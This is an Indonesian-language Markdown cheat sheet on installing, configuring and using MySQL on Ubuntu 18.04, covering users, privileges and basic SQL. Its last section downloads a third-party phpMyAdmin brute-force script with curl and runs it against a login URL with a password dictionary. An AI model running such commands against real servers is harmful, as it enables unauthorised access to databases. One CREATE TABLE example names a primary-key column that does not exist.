# MySQL server di Ubuntu 18.04
> Disusun Oleh Hardiyanto

### Daftar Isi
* [Install MySQL](#install-mysql)
    * [Izinkan Remote akses](#izinkan-remote-akses)
    * [Launch at reboot](#launch-at-reboot)
    * [Configure interfaces](#configure-interfaces)
    * [Start the mysql shell](#start-the-mysql-shell)
* [Uninstall MySQL](#uninstall-mysql)
    * [Re-install MySQL Server](#re-install-mysql-server)
* [Configure MySQL](#configure-mysql)
    * [Set the root password](#set-the-root-password)
    * [Buat User Baru](#buat-user-baru)
    * [Hak Akses user](#hak-akses-user)
    * [Cabut Hak Akses](#cabut-hak-akses)
    * [Option Hak Akses](#option-hak-akses)
    * [Melihat Detail User](#melihat-detail-user)
    * [Hapus User](#hapus-user)
    * [Reload](#reload)
    * [Reset the MySQL/MariaDB Root Password](#reset-the-mysqlmariadb-root-password)
* [Basic MySQL](#basic-mysql)
    * [Buat Tabel](#buat-tabel)
    * [Untuk Melihat Struktur Tabel](#untuk-melihat-struktur-tabel)
    * [Hapus Tabel](#hapus-tabel)
    * [Insert tabel](#insert-tabel)
    * [Update tabel](#update-tabel)
    * [Delete data](#delete-data)
    * [Limit Data](#limit-data)
    * [Select Distinct](#select-distinct)
* [BruteForce phpmyadmin](#bruteforce-phpmyadmin)
    
<br>
<br>


#### Install MySQL 
```
$ sudo apt-get update
```
```
$ sudo apt-get install mysql-server
```
```
$ sudo mysql_secure_installation utility
```
Utilitas ini meminta Anda untuk menentukan kata sandi root mysql dan opsi terkait keamanan lainnya, termasuk menghapus akses jarak jauh ke pengguna root dan mengatur kata sandi root.


#### Izinkan Remote akses
Jika Anda memiliki iptables yang diaktifkan dan ingin terhubung ke database MySQL dari komputer lain, Anda harus membuka port di firewall server Anda (port default adalah 3306). Anda tidak perlu melakukan ini jika aplikasi yang menggunakan MySQL berjalan di server yang sama.
```
$ sudo ufw enable
```
```
$ sudo ufw allow mysql
```
#### Start the MySQL service
```
$ sudo systemctl start mysql
```

#### Launch at reboot
```
$ sudo systemctl enable mysql
```

#### Configure interfaces
```
bind-address		= 127.0.0.1 ( The default. )
bind-address		= XXX.XXX.XXX.XXX ( The ip address of your Public Net interface. )
bind-address		= ZZZ.ZZZ.ZZZ.ZZZ ( The ip address of your Service Net interface. )
bind-address		= 0.0.0.0 ( All ip addresses. )
```

##### Start the mysql shell
```
$ mysql -u root -p
```

### Uninstall MySQL

#### Re-install MySQL Server
Berikut langkahnya : <br>

``` 
$ sudo apt-get purge mysql-server mysql-common mysql-client 
```
``` 
$ sudo apt-get install mysql-client mysql-server mysql-common
````

### Configure MySQL

##### Set the root password
```
mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
```
Kemudian, jalankan FLUSH PRIVILEGES yang memberi tahu server untuk memuat ulang tabel dan menerapkan perubahan baru Anda:
```
mysql> FLUSH PRIVILEGES;
```

##### Buat User Baru 
```
mysql> CREATE USER 'hard'@'localhost' IDENTIFIED BY 'password';
```


##### Hak Akses user

```
mysql> GRANT ALL PRIVILEGES ON NAMA_DATABASE . NAMA_TABEL  TO 'hard'@'localhost' WITH GRANT OPTION;
```

##### Cabut Hak Akses
```
REVOKE  ALL PRIVILEGES ON NAMA_DATABASE . NAMA_TABEL FROM 'coba'@'localhost';
```

##### Option Hak Akses

```ALL PRIVILEGES```- seperti yang kita lihat sebelumnya, ini akan memungkinkan pengguna MySQL akses penuh ke database yang ditunjuk (atau jika tidak ada database yang dipilih, akses global di seluruh sistem).<br>
```CREATE```- memungkinkan mereka untuk membuat tabel atau database baru.<br>
```DROP``` - memungkinkan mereka untuk menghapus tabel atau database.<br>
```DELETE``` - memungkinkan mereka untuk menghapus baris dari tabel.<br>
```INSERT``` - memungkinkan mereka untuk memasukkan baris ke dalam tabel.<br>
```SELECT``` - memungkinkan mereka untuk menggunakan perintah SELECT untuk membaca database.<br>
```UPDATE``` - memungkinkan mereka untuk memperbarui baris tabel.<br>
```GRANT OPTION``` - memungkinkan mereka untuk memberikan atau menghapus hak pengguna lain.<br>

#### Melihat Detail User
```
select * from mysql.user;
```
```
select host, user, password from mysql.user;
```
```
desc mysql.user;
```

#### Hapus User
```
drop user coba@localhost;
```

#### Reload
```
FLUSH PRIVILEGES;
```

#### Reset the MySQL/MariaDB Root Password

Untuk set root :
```
$ sudo mysqladmin --user=root password "newpassword"
```

Untuk reset password :
```
$ sudo mysqladmin --user=root --password=oldpassword password "newpassword"
```

### Basic MySQL

#### Buat Tabel
```
CREATE TABLE `data` (
	`id_dataSpasial` INT(11) NOT NULL AUTO_INCREMENT,
	`batas_wilayah` VARCHAR(20),
	`data_kejadian` VARCHAR(20),
	PRIMARY KEY (`id_data`)
);
```
#### Untuk Melihat Struktur Tabel
```
DESC NamaTabel;
```

#### Select Distinct
```
SELECT DISTINCT select_list
FROM table_name;
```

#### Hapus Tabel
```
DROP TABLE namaTabel;
```

#### Insert tabel
```
INSERT INTO nama_tabel (column1, column2, column3,...)
VALUES (value1, value2, value3,...)
```

#### Update tabel
```
UPDATE table_name
SET column1=value, column2=value2,...
WHERE some_column=some_value 
```

#### Delete data
```
DELETE FROM nama_tabel WHERE column = value
```
Misalkan :
```
DELETE FROM coba WHERE id = 1
```

#### Limit Data
```
SELECT * FROM nama_tabel LIMIT 30
```

### BruteForce phpmyadmin
```
curl https://raw.githubusercontent.com/safflower/phpmyadmin-authentication-bruteforce/master/main.py > main.py
```
```
python3 main.py -url http://example.com/pma/ -user root -dict password.txt
```
Bisa dilihat link dibawah ini :
https://github.com/safflower/phpmyadmin-authentication-bruteforce



### Terima Kasih
